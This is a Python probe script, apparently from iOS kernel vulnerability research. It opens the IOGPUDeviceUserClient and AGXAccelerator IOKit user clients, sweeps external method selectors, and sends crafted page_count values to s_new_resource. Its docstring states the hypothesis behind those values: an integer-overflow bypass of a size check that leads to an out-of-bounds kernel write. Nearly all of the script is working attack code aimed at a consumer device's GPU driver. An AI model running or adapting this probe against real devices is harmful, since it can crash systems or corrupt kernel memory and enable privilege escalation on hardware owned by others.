#!/usr/bin/env python3
"""
probe_iogpu_device.py — Open IOGPUDeviceUserClient and test s_new_resource overflow.

Binary analysis (session-14) established:
  - IOGPUDeviceUserClient: IOServiceOpen("IOGPUDevice", type=1)
    - Only type=1 is accepted (confirmed via fcn.fffffff009c16634 cmp x1,1; b.ne fail)
  - AGXDeviceUserClient: IOServiceOpen("AGXAccelerator", type=1) [prior empirical]
  - s_new_resource (sel=2): reads input[0x50]=page_count when bit3 of input[0x15] set
    min input size 0x58 (from fcn.fffffff009bf72bc analysis)

Overflow hypothesis for s_new_resource:
  page_count is used in size check: (u32)(page_count * 0x1000) >= 0x800000 → BadArg
  Bypass: page_count=0x100001 → (u32)(0x100001 * 0x1000) = 0x1000 → passes
  Then page-pool lookup uses page_count as array index (page_count * 8) → OOB write
"""
import ctypes, struct, sys, time, os

APPGROUP = "/private/var/mobile/Containers/Shared/AppGroup/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
LOG = f"{APPGROUP}/probe_iogpu_device.txt"

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    sys.stdout.write(line); sys.stdout.flush()
    with open(LOG, "a") as f: f.write(line); f.flush(); os.fsync(f.fileno())

log("=== probe_iogpu_device ===")

IOKIT = ctypes.CDLL("/System/Library/Frameworks/IOKit.framework/IOKit")
IOKIT.IOServiceGetMatchingService.restype  = ctypes.c_uint32
IOKIT.IOServiceGetMatchingService.argtypes = [ctypes.c_uint32, ctypes.c_void_p]
IOKIT.IOServiceMatching.restype   = ctypes.c_void_p
IOKIT.IOServiceMatching.argtypes  = [ctypes.c_char_p]
IOKIT.IOServiceOpen.restype  = ctypes.c_int32
IOKIT.IOServiceOpen.argtypes = [ctypes.c_uint32, ctypes.c_uint32, ctypes.c_uint32,
                                 ctypes.POINTER(ctypes.c_uint32)]
IOKIT.mach_task_self_.restype  = ctypes.c_uint32
IOKIT.mach_task_self_.argtypes = []
IOKIT.IOConnectCallStructMethod.restype  = ctypes.c_int32
IOKIT.IOConnectCallStructMethod.argtypes = [
    ctypes.c_uint32, ctypes.c_uint32,
    ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t),
]
IOKIT.IOObjectRelease.restype  = ctypes.c_int32
IOKIT.IOObjectRelease.argtypes = [ctypes.c_uint32]

def open_svc(cls_name):
    nd = IOKIT.IOServiceMatching(cls_name.encode())
    if not nd: return 0, f"IOServiceMatching null"
    svc = IOKIT.IOServiceGetMatchingService(0, nd)
    return svc, ("ok" if svc else "no service")

def open_conn(svc, conn_type):
    task = IOKIT.mach_task_self_()
    conn = ctypes.c_uint32(0)
    kr = IOKIT.IOServiceOpen(svc, task, conn_type, ctypes.byref(conn))
    if kr != 0: return 0, f"open kr={kr:#010x}"
    return conn.value, "ok"

def call_struct(conn, sel, in_bytes):
    out     = ctypes.create_string_buffer(4096)
    out_sz  = ctypes.c_size_t(4096)
    in_buf  = ctypes.create_string_buffer(in_bytes, len(in_bytes))
    kr = IOKIT.IOConnectCallStructMethod(
        conn, sel,
        ctypes.cast(in_buf, ctypes.c_void_p), len(in_bytes),
        ctypes.cast(out,    ctypes.c_void_p), ctypes.byref(out_sz),
    )
    return kr

# ── 1. Open IOGPUDeviceUserClient via "IOGPUDevice" type=1 ───────────────────
log("--- Service open: IOGPUDevice type=1 ---")
iogpu_svc, msg = open_svc("IOGPUDevice")
log(f"  IOGPUDevice svc={iogpu_svc:#x}  ({msg})")

iogpu_conn = 0
if iogpu_svc:
    for t in range(3):
        c, cmsg = open_conn(iogpu_svc, t)
        log(f"  type={t}: conn={c:#x}  {cmsg}")
        if c and not iogpu_conn:
            iogpu_conn = c
    IOKIT.IOObjectRelease(iogpu_svc)

# ── 2. AGXAccelerator type=1 as baseline (should still work) ─────────────────
log("--- Service open: AGXAccelerator type=1 (baseline) ---")
agx_svc, msg2 = open_svc("AGXAccelerator")
log(f"  AGXAccelerator svc={agx_svc:#x}  ({msg2})")
agx_conn = 0
if agx_svc:
    c, cmsg = open_conn(agx_svc, 1)
    log(f"  type=1: conn={c:#x}  {cmsg}")
    agx_conn = c
    IOKIT.IOObjectRelease(agx_svc)

# ── 3. If we have an IOGPUDeviceUserClient conn, probe it ────────────────────
if iogpu_conn:
    log(f"--- IOGPUDeviceUserClient conn={iogpu_conn:#x}: sel sweep 0-13 ---")
    zeroed = bytes(0x58)
    for sel in range(14):
        kr = call_struct(iogpu_conn, sel, zeroed)
        log(f"  sel={sel:2d}: kr={kr:#010x}")

    # s_new_resource (sel=2): page_count overflow test
    log("--- s_new_resource sel=2 page_count sweep at input[0x50] ---")
    for pc, lbl in [
        (0x0000, "zero"),
        (0x0001, "one"),
        (0x07ff, "0x7ff  (max legit: 0x7ff000 < 0x800000)"),
        (0x0800, "0x800  (boundary: 0x800000 >= 0x800000 → BadArg?)"),
        (0x100000, "0x100000 (wrap: * 0x1000 → 0x0)"),
        (0x100001, "0x100001 (bypass: * 0x1000 → 0x1000)"),
        (0x100800, "0x100800 (re-caught: * 0x1000 → 0x800000)"),
        (0xffffffff, "0xffffffff (max wrap)"),
    ]:
        buf = bytearray(0x58)
        struct.pack_into('<I', buf, 0x00, 0x80)   # resource type flags
        struct.pack_into('<B', buf, 0x15, 0x08)   # bit 3 → enable page_count path
        struct.pack_into('<I', buf, 0x50, pc)
        kr = call_struct(iogpu_conn, 2, bytes(buf))
        log(f"  [0x50]={pc:#010x}: kr={kr:#010x}  {lbl}")

else:
    log("!!! Could not open IOGPUDeviceUserClient — check service name and type")

log("=== DONE ===")
